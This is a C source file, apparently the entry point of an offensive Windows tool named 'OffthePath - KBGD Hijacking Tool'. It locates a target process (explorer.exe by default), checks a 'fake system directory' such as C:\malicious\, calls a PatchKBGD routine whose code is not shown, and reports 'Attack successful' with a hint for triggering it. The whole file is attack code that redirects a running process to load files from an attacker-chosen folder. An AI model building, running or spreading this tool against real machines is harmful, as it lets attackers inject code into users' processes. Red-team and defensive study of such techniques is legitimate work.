#include "kbgd.h"
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>

void PrintUsage(const WCHAR* progName) {
    wprintf(L"Usage: %ws [options]\n\n", progName);
    wprintf(L"Options:\n");
    wprintf(L"  --pid <PID>          Target process by PID\n");
    wprintf(L"  --target <name>      Target process by name\n");
    wprintf(L"  --path <directory>   Fake system directory (must end with \\)\n");
    wprintf(L"  --help               Show this message\n\n");
    wprintf(L"Example:\n");
    wprintf(L"  %ws --target explorer.exe --path C:\\malicious\\\n", progName);
}

DWORD FindProcess(const WCHAR* processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create process snapshot (Error: %lu)\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32W pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (lstrcmpiW(processName, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32NextW(snapshot, &pe32));

    CloseHandle(snapshot);

    if (pid) {
        printf("[+] Found '%ws' (PID: %lu)\n", processName, pid);
    } else {
        printf("[-] Process '%ws' not found\n", processName);
    }

    return pid;
}

BOOL ValidatePath(const WCHAR* path) {
    DWORD attrs = GetFileAttributesW(path);
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        printf("[-] Path '%ws' does not exist\n", path);
        return FALSE;
    }
    if (!(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        printf("[-] Path '%ws' is not a directory\n", path);
        return FALSE;
    }
    return TRUE;
}

int wmain(int argc, WCHAR* argv[]) {
    DWORD targetPid = 0;
    WCHAR* fakePath = NULL;
    WCHAR* targetName = NULL;

    const WCHAR* DEFAULT_PATH = L"C:\\malicious\\";
    const WCHAR* DEFAULT_TARGET = L"explorer.exe";

    wprintf(L"\nOffthePath - KBGD Hijacking Tool\n");
    wprintf(L"=================================\n\n");

    // Parse arguments
    for (int i = 1; i < argc; i++) {
        if (wcscmp(argv[i], L"--help") == 0 || wcscmp(argv[i], L"-h") == 0) {
            PrintUsage(argv[0]);
            return 0;
        }
        else if (wcscmp(argv[i], L"--pid") == 0 && i + 1 < argc) {
            targetPid = _wtoi(argv[++i]);
        }
        else if (wcscmp(argv[i], L"--target") == 0 && i + 1 < argc) {
            targetName = argv[++i];
        }
        else if (wcscmp(argv[i], L"--path") == 0 && i + 1 < argc) {
            fakePath = argv[++i];
        }
        else {
            wprintf(L"[-] Unknown option: %ws\n", argv[i]);
            PrintUsage(argv[0]);
            return 1;
        }
    }

    // Apply defaults
    if (!fakePath) {
        fakePath = (WCHAR*)DEFAULT_PATH;
        printf("[*] Using default path: %ws\n", fakePath);
    }

    if (targetPid == 0 && !targetName) {
        targetName = (WCHAR*)DEFAULT_TARGET;
        printf("[*] Using default target: %ws\n", targetName);
    }

    // Validate path exists
    if (!ValidatePath(fakePath)) {
        return 1;
    }

    // Resolve target PID
    if (targetPid == 0 && targetName) {
        targetPid = FindProcess(targetName);
        if (!targetPid) {
            return 1;
        }
    }

    if (targetPid == 0) {
        printf("[-] No valid target specified\n");
        return 1;
    }

    // Show config
    wprintf(L"\n[*] Target PID: %lu\n", targetPid);
    wprintf(L"[*] Fake path: %ws\n\n", fakePath);

    // Execute attack
    if (!PatchKBGD(targetPid, fakePath)) {
        printf("\n[-] Attack failed\n");
        return 1;
    }

    printf("\n[+] Attack successful!\n");

    if (targetName && lstrcmpiW(targetName, L"explorer.exe") == 0) {
        printf("[*] Trigger: Open a File Explorer window (Win+E)\n");
    }

    return 0;
}
